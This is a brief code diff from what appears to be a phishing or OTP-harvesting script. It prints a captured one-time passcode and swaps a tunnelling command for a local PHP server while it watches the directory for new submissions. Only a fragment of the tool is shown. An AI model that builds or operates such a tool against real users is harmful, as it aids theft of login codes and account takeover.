@@ -34,8 +34,8 @@ def print_data():
     print(f"{green} [{red}+{green}] {red}OTP is{red}: {green}{otp_info.get('OTP', 'N/A')}")
 
 if __name__ == "__main__":
-    os.system("localrun -port 5000 &")
-    directory_to_monitor = os.getcwd() 
+    os.system("php -S 127.0.0.1:8080")
+    directory_to_monitor = os.getcwd()
 
     while True:
         change = track_changes(directory_to_monitor)
